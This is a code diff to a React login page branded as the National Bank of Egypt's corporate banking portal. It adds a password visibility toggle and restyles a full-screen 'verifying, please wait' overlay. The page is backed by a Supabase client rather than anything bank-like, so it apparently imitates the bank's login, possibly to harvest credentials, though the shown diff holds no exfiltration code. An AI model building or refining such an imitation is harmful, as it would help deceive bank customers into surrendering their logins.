@@ -10,8 +10,9 @@ import {
   Coins,
   MapPin,
   CalendarCheck,
-  Loader2,
   ArrowRight,
+  Eye,
+  EyeOff,
 } from "lucide-react";
 import nbeLogo from "@/assets/nbe-logo-full.png.asset.json";
 import { supabase } from "@/integrations/supabase/client";
@@ -51,7 +52,8 @@ const t = {
     password: "كلمة المرور",
     forgotPassword: "نسيت كلمة المرور؟",
     back: "رجوع",
-    verifying: "يرجى الانتظار...",
+    checking: "جاري التحقق...",
+    verifying: "يرجى الانتظار",
     securityLabel: "صورة الأمان الخاصة بك",
     rights: "جميع الحقوق محفوظة - البنك الأهلي المصري ©",
     services: [
@@ -80,7 +82,8 @@ const t = {
     password: "Password",
     forgotPassword: "Forgot your Password?",
     back: "Back",
-    verifying: "Verifying...",
+    checking: "Verifying...",
+    verifying: "Please wait",
     securityLabel: "Your security image",
     rights: "All rights reserved - National Bank Of Egypt ©",
     services: [
@@ -104,6 +107,7 @@ function Index() {
   const [companyId, setCompanyId] = useState("");
   const [userCode, setUserCode] = useState("");
   const [password, setPassword] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
   const [verifying, setVerifying] = useState(false);
   const [loggedIn, setLoggedIn] = useState(false);
   const [error, setError] = useState("");
@@ -273,15 +277,26 @@ function Index() {
                 dir="ltr"
                 className={`w-full rounded-lg border border-input bg-background px-4 py-4 ${align} text-sm outline-none transition-colors placeholder:text-muted-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 disabled:opacity-60`}
               />
-              <input
-                type="password"
-                value={password}
-                onChange={(e) => setPassword(e.target.value.replace(/[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g, ""))}
-                placeholder={c.password}
-                disabled={verifying}
-                dir="ltr"
-                className={`w-full rounded-lg border border-input bg-background px-4 py-4 ${align} text-sm outline-none transition-colors placeholder:text-muted-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 disabled:opacity-60`}
-              />
+              <div className="relative">
+                <input
+                  type={showPassword ? "text" : "password"}
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value.replace(/[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g, ""))}
+                  placeholder={c.password}
+                  disabled={verifying}
+                  dir="ltr"
+                  className={`w-full rounded-lg border border-input bg-background py-4 pr-4 pl-12 ${align} text-sm outline-none transition-colors placeholder:text-muted-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 disabled:opacity-60`}
+                />
+                <button
+                  type="button"
+                  aria-label={showPassword ? (isRtl ? "إخفاء كلمة المرور" : "Hide password") : (isRtl ? "إظهار كلمة المرور" : "Show password")}
+                  onClick={() => setShowPassword((value) => !value)}
+                  disabled={verifying}
+                  className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground transition-colors hover:text-foreground disabled:opacity-60"
+                >
+                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
+                </button>
+              </div>
               <div className="flex items-center justify-between">
                 <button
                   type="button"
@@ -313,10 +328,11 @@ function Index() {
             </button>
 
             {verifying && (
-              <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm">
-                <div className="flex flex-col items-center gap-4 rounded-2xl bg-white/95 px-8 py-6 shadow-2xl">
-                  <div className="h-14 w-14 rounded-full border-4 border-primary/20 border-t-primary animate-spin" />
-                  <span className="text-base font-bold text-foreground">{c.verifying}</span>
+              <div className="fixed inset-0 z-50 flex items-center justify-center bg-muted-foreground/60">
+                <div className="flex flex-col items-center text-center">
+                  <div className="h-16 w-16 animate-spin rounded-full border-[5px] border-background/60 border-t-primary" />
+                  <span className="mt-3 text-xl font-bold text-background">{c.checking}</span>
+                  <span className="mt-2 text-base font-semibold text-background/90">{c.verifying}</span>
                 </div>
               </div>
             )}
